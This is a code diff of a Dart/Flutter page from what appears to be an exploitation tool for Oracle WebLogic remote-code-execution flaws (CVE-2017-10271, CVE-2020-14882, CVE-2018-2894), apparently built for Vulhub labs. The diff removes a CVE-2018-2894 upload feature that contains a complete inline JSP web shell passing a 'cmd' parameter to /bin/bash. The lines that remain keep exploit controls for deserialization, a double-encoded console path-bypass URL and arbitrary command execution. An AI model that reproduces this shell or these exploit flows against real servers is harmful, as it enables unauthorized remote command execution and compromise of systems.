@@ -19,25 +19,19 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
 
   @override
   String get appBarTitle =>
-      'Oracle WebLogic CVE-2017-10271 / CVE-2020-14882 / CVE-2018-2894 RCE';
+      'Oracle WebLogic CVE-2017-10271 / CVE-2020-14882 RCE';
 
   @override
   String get cardTitle => 'Oracle WebLogic RCE';
 
   @override
   String get cardSubtitle =>
-      'XMLDecoder 反序列化 + 控制台未授权 + WS 测试页文件上传 RCE';
+      'XMLDecoder 反序列化 + 控制台未授权 RCE';
 
   final _urlCtrl      = TextEditingController();
   final _cmdCtrl      = TextEditingController(text: 'id');
   final _timeoutCtrl  = TextEditingController();
-  final _workDirCtrl  = TextEditingController(
-    text: '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer'
-        '/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls'
-        '/4mcj4y/war/css',
-  );
-
-  // 0=CVE-2017-10271  1=CVE-2020-14882  2=CVE-2018-2894
+  // 0=CVE-2017-10271  1=CVE-2020-14882
   int _tab = 0;
 
   WebLogicExpService _svc() => WebLogicExpService(
@@ -63,14 +57,6 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
       appendLog('[*] 检测 CVE-2020-14882 控制台路径绕过...');
       try {
         final r = await _svc().checkCve202014882();
-        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到');
-      } catch (e) {
-        appendLog('[!] 异常: $e');
-      }
-    } else {
-      appendLog('[*] 检测 CVE-2018-2894 Web Service 测试客户端...');
-      try {
-        final r = await _svc().checkCve20182894();
         appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到');
       } catch (e) {
         appendLog('[!] 异常: $e');
@@ -102,51 +88,8 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
       } catch (e) {
         appendLog('[!] 异常: $e');
       }
-    } else {
-      appendLog('[!] CVE-2018-2894 无命令执行接口，请使用 GetShell 功能');
     }
     if (mounted) setState(() => running = false);
-  }
-
-  Future<void> _getShell2894() async {
-    if (_urlCtrl.text.trim().isEmpty) {
-      appendLog('[!] 请输入目标 URL');
-      return;
-    }
-    final workDir = _workDirCtrl.text.trim();
-    if (workDir.isEmpty) {
-      appendLog('[!] 请输入 Work Home Dir');
-      return;
-    }
-    setState(() => running = true);
-    appendLog('[*] CVE-2018-2894 GetShell...');
-    appendLog('[*] Step 1 — 修改 Work Home Dir: $workDir');
-    try {
-      // 内联简单 JSP shell（无冰蝎依赖），避免加载 asset 失败
-      const shellContent =
-          '<%@ page import="java.util.*,java.io.*"%>'
-          '<%if(request.getParameter("cmd")!=null){'
-          'Process p=Runtime.getRuntime().exec(new String[]{'
-          '"/bin/bash","-c",request.getParameter("cmd")});'
-          'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));'
-          'StringBuilder sb=new StringBuilder();String line;'
-          'while((line=br.readLine())!=null)sb.append(line).append("\\n");'
-          'out.print(sb);}%>';
-      final shellUrl = await _svc().getShellCve20182894(
-        shellContent,
-        workDir: workDir,
-      );
-      if (shellUrl != null) {
-        appendLog('[+] Shell 写入成功: $shellUrl?cmd=id');
-      } else {
-        appendLog('[-] GetShell 失败（路径不可访问或上传被拒）');
-        appendLog('[i] 请确认 workDir 对应 /ws_utc/css/ 可从 Web 访问');
-      }
-    } catch (e) {
-      appendLog('[!] 异常: $e');
-    } finally {
-      if (mounted) setState(() => running = false);
-    }
   }
 
   @override
@@ -154,7 +97,6 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
     _urlCtrl.dispose();
     _cmdCtrl.dispose();
     _timeoutCtrl.dispose();
-    _workDirCtrl.dispose();
     super.dispose();
   }
 
@@ -180,8 +122,6 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
               _tabBtn('CVE-2017-10271', 0),
               const SizedBox(width: 6),
               _tabBtn('CVE-2020-14882', 1),
-              const SizedBox(width: 6),
-              _tabBtn('CVE-2018-2894', 2),
             ],
           ),
           const SizedBox(height: 8),
@@ -195,8 +135,7 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
             child: Text(
               switch (_tab) {
                 0 => 'XMLDecoder 反序列化 → /wls-wsat/CoordinatorPortType\n无直接回显，需结合 OOB/写文件验证',
-                1 => '控制台路径绕过 → /console/css/%252e%252e%252fconsole.portal\n无直接回显',
-                _ => '文件上传 → /ws_utc/begin.do 修改工作目录\n再 multipart 上传 JSP → /ws_utc/css/{ts}.jsp',
+                _ => '控制台路径绕过 → /console/css/%252e%252e%252fconsole.portal\n无直接回显',
               },
               style: AppTextStyles.caption(
                 size: 11,
@@ -207,33 +146,10 @@ class _WebLogicPageState extends BaseVulhubExpPageState<WebLogicExpPage> {
           const SizedBox(height: 8),
           vBtn('检测漏洞', running ? null : _check),
           const SizedBox(height: 16),
-          if (_tab != 2) ...[
-            vSecTitle('命令执行'),
-            vTf(_cmdCtrl, '命令', 'id'),
-            const SizedBox(height: 8),
-            vBtn('执行命令', running ? null : _exec),
-          ] else ...[
-            vSecTitle('CVE-2018-2894 GetShell'),
-            vTf(_workDirCtrl, 'Work Home Dir (css 目录路径)', '/u01/.../css'),
-            const SizedBox(height: 8),
-            vBtn('GetShell (上传 JSP)', running ? null : _getShell2894),
-            const SizedBox(height: 8),
-            Container(
-              padding: const EdgeInsets.all(8),
-              decoration: BoxDecoration(
-                color: AppColors.bgDark,
-                borderRadius: BorderRadius.circular(6),
-                border: Border.all(
-                    color: AppColors.primary.withValues(alpha: 0.3)),
-              ),
-              child: Text(
-                'Shell 访问: /ws_utc/css/{timestamp}.jsp?cmd=id\n'
-                'Work Dir 默认为 vulhub 12.2.1.3 路径，生产环境需调整',
-                style: AppTextStyles.caption(
-                    size: 10, color: AppColors.textMuted),
-              ),
-            ),
-          ],
+          vSecTitle('命令执行'),
+          vTf(_cmdCtrl, '命令', 'id'),
+          const SizedBox(height: 8),
+          vBtn('执行命令', running ? null : _exec),
         ],
       ),
     );
